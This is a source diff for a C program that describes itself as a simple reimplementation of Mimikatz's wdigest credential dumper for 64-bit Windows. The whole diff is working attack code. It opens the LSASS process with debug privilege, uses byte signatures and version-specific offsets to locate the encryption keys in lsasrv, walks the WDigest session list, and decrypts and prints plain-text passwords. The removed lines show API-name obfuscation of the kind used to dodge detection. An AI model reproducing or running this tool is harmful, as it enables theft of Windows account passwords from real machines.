@@ -17,13 +17,7 @@
 #pragma comment(lib,"psapi.lib")
 #pragma comment(lib, "advapi32.lib")
 
-typedef BOOL(NTAPI* _NtReadProcessMemory)(
-	HANDLE  hProcess,
-	LPCVOID lpBaseAddress,
-	LPVOID  lpBuffer,
-	SIZE_T  nSize,
-	SIZE_T* lpNumberOfBytesRead
-);
+//** Offsets and Structs credited to Mimikatz **/
 
 typedef struct _KIWI_WDIGEST_LIST_ENTRY {
 	struct _KIWI_WDIGEST_LIST_ENTRY* Flink;
@@ -35,12 +29,12 @@ typedef struct _KIWI_WDIGEST_LIST_ENTRY {
 	UNICODE_STRING UserName; // 0x30
 	UNICODE_STRING Domaine;  // 0x40
 	UNICODE_STRING Password; // 0x50
-} KIWI_WDIGEST_LIST_ENTRY, * PKIWI_WDIGEST_LIST_ENTRY;
+} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;
 
 typedef struct _KIWI_HARD_KEY {
 	ULONG cbSecret;
 	BYTE data[60]; // etc...
-} KIWI_HARD_KEY, * PKIWI_HARD_KEY;
+} KIWI_HARD_KEY, *PKIWI_HARD_KEY;
 
 
 typedef struct _KIWI_BCRYPT_KEY {
@@ -51,7 +45,7 @@ typedef struct _KIWI_BCRYPT_KEY {
 	ULONG unk1;
 	ULONG bits;
 	KIWI_HARD_KEY hardkey;
-} KIWI_BCRYPT_KEY, * PKIWI_BCRYPT_KEY;
+} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;
 
 typedef struct _KIWI_BCRYPT_KEY81 {
 	ULONG size;
@@ -68,7 +62,7 @@ typedef struct _KIWI_BCRYPT_KEY81 {
 	ULONG unk8;
 	ULONG unk9;
 	KIWI_HARD_KEY hardkey;
-} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;
+} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;
 
 typedef struct _KIWI_BCRYPT_HANDLE_KEY {
 	ULONG size;
@@ -76,7 +70,7 @@ typedef struct _KIWI_BCRYPT_HANDLE_KEY {
 	PVOID hAlgorithm;
 	PKIWI_BCRYPT_KEY81 key;
 	PVOID unk0;
-} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;
+} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;
 
 // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
 unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };
@@ -136,17 +130,19 @@ ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen, unsigned ch
 }
 
 // Read memory from LSASS process
-SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void* memOut, int memOutLen) {
+SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void *memOut, int memOutLen) {
 	SIZE_T bytesRead = 0;
 
-	char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
-	char rpfm[] = { 'R','e','a','d','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
-	_NtReadProcessMemory ffNtRead_ProcessMemory = GetProcAddress(GetModuleHandleA(kernel32), rpfm);
-
 	memset(memOut, 0, memOutLen);
-	ffNtRead_ProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);
+	ReadProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);
 
 	return bytesRead;
+}
+
+// Open a handle to the LSASS process
+HANDLE GrabLsassHandle(int pid) {
+	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+	return procHandle;
 }
 
 // Searches for a provided pattern in memory and returns the offset
@@ -182,7 +178,7 @@ int FindKeysOnWin7(HANDLE hLsass, char* lsasrvMem) {
 	void* keyPointer = NULL;
 
 	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
-	unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
+	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
 	if (lsasrvLocal == (unsigned char*)0) {
 		printf("[x] Error: Could not load lsasrv.dll locally\n");
 		return 1;
@@ -271,7 +267,7 @@ int FindKeysOnWin8(HANDLE hLsass, char* lsasrvMem) {
 	void* keyPointer = NULL;
 
 	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
-	unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
+	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
 	if (lsasrvLocal == (unsigned char*)0) {
 		printf("[x] Error: Could not load lsasrv.dll locally\n");
 		return 1;
@@ -348,8 +344,8 @@ int FindKeysOnWin8(HANDLE hLsass, char* lsasrvMem) {
 // before Win10_1903
 int FindKeysOnWin10(HANDLE hLsass, char* lsasrvMem) {
 	BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
-	int IV_OFFSET = 67;
-	int DES_OFFSET = -89;
+	int IV_OFFSET = 61;
+	int DES_OFFSET = -73;
 	int AES_OFFSET = 16;
 
 	DWORD keySigOffset = 0;
@@ -360,7 +356,7 @@ int FindKeysOnWin10(HANDLE hLsass, char* lsasrvMem) {
 	void* keyPointer = NULL;
 
 	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
-	unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
+	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
 	if (lsasrvLocal == (unsigned char*)0) {
 		printf("[x] Error: Could not load lsasrv.dll locally\n");
 		return 1;
@@ -434,8 +430,8 @@ int FindKeysOnWin10(HANDLE hLsass, char* lsasrvMem) {
 }
 
 // Reads out a LSA_UNICODE_STRING from lsass address provided
-UNICODE_STRING* ExtractUnicodeString(HANDLE hLsass, char* addr) {
-	UNICODE_STRING* str;
+UNICODE_STRING *ExtractUnicodeString(HANDLE hLsass, char* addr) {
+	UNICODE_STRING *str;
 	WORD* mem;
 
 	str = (UNICODE_STRING*)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
@@ -468,7 +464,7 @@ int FindCredentials(HANDLE hLsass, char* wdigestMem) {
 	DWORD logSessListSigOffset, logSessListOffset;
 	unsigned char* logSessListAddr;
 	unsigned char* wdigestLocal;
-	unsigned char* llCurrent, * llStart;
+	unsigned char* llCurrent, *llStart;
 	unsigned char passDecrypted[1024];
 
 	// Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
@@ -510,8 +506,8 @@ int FindCredentials(HANDLE hLsass, char* wdigestMem) {
 		if (entry.UsageCount == 1) {
 
 			UNICODE_STRING* username = ExtractUnicodeString(hLsass, (char*)llCurrent + USERNAME_OFFSET);
-			UNICODE_STRING* hostname = ExtractUnicodeString(hLsass, (char*)llCurrent + HOSTNAME_OFFSET);
-			UNICODE_STRING* password = ExtractUnicodeString(hLsass, (char*)llCurrent + PASSWORD_OFFSET);
+			UNICODE_STRING * hostname = ExtractUnicodeString(hLsass, (char*)llCurrent + HOSTNAME_OFFSET);
+			UNICODE_STRING * password = ExtractUnicodeString(hLsass, (char*)llCurrent + PASSWORD_OFFSET);
 
 			if (username != NULL && username->Length != 0) {
 				printf("\n[-->] Username: %ls\n", username->Buffer);
@@ -551,11 +547,30 @@ int FindCredentials(HANDLE hLsass, char* wdigestMem) {
 	return 0;
 }
 
+// Searches for lsass.exe PID
+int GetLsassPid() {
+
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(hSnapshot, &entry)) {
+		while (Process32Next(hSnapshot, &entry)) {
+			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
+				return entry.th32ProcessID;
+			}
+		}
+	}
+
+	CloseHandle(hSnapshot);
+	return 0;
+}
+
 BOOL EnableDebugPrivilege(BOOL fEnable)
 {
 	BOOL fOk = FALSE;
 	HANDLE hToken;
-
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
 	{
 		TOKEN_PRIVILEGES tp;
@@ -569,9 +584,11 @@ BOOL EnableDebugPrivilege(BOOL fEnable)
 	return(fOk);
 }
 
+
+
 int GetOSVersion()
 {
-	typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
+	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
 	HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
 	DWORD dwMajor, dwMinor, dwBuildNumber;
 	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
@@ -586,7 +603,7 @@ int GetOSVersion()
 	GetSystemInfo(&info);
 	OSVERSIONINFOEX os;
 	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	if (GetVersionEx((OSVERSIONINFO*)&os))
+	if (GetVersionEx((OSVERSIONINFO *)&os))
 	{
 		switch (os.dwMajorVersion)
 		{
@@ -629,27 +646,8 @@ int GetOSVersion()
 	return 0;
 }
 
-typedef BOOL(NTAPI* _NtEnumProcessModules)(
-	HANDLE  hProcess,
-	HMODULE* lphModule,
-	DWORD   cb,
-	LPDWORD lpcbNeeded
-);
-
-typedef DWORD(NTAPI* _NtGetModuleFileNameExA)(
-	HANDLE  hProcess,
-	HMODULE hModule,
-	LPSTR   lpFilename,
-	DWORD   nSize
-);
-
-char psapi[] = { 'p','s','a','p','i','.','d','l','l',0};
-char epm[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s',0};
-
 int main()
 {
-	_NtEnumProcessModules ffNtEnum_ProcessModules = GetProcAddress(GetModuleHandleA(psapi), epm);
-
 	printf("\nUse to get plain-text credentials of the 64-bit OS.\n");
 	printf("This is a simple implementation of Mimikatz's sekurlsa::wdigest\n\n");
 	printf("Support:\n");
@@ -670,17 +668,17 @@ int main()
 	HMODULE lsassDll[1024];
 	DWORD bytesReturned;
 	char modName[MAX_PATH];
-	char* lsass = NULL, * lsasrv = NULL, * wdigest = NULL;
+	char* lsass = NULL, *lsasrv = NULL, *wdigest = NULL;
 
 	// Open up a PROCESS_QUERY_INFORMATION | PROCESS_VM_READ handle to lsass process
-	hLsass = enum_lsass_handles();
+	hLsass = GrabLsassHandle(GetLsassPid());
 	if (hLsass == INVALID_HANDLE_VALUE) {
 		printf("[x] Error: Could not open handle to lsass process\n");
 		return 1;
 	}
 
 	// Enumerate all loaded modules within lsass process
-	if (ffNtEnum_ProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {
+	if (EnumProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {
 
 		// For each DLL address, get its name so we can find what we are looking for
 		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
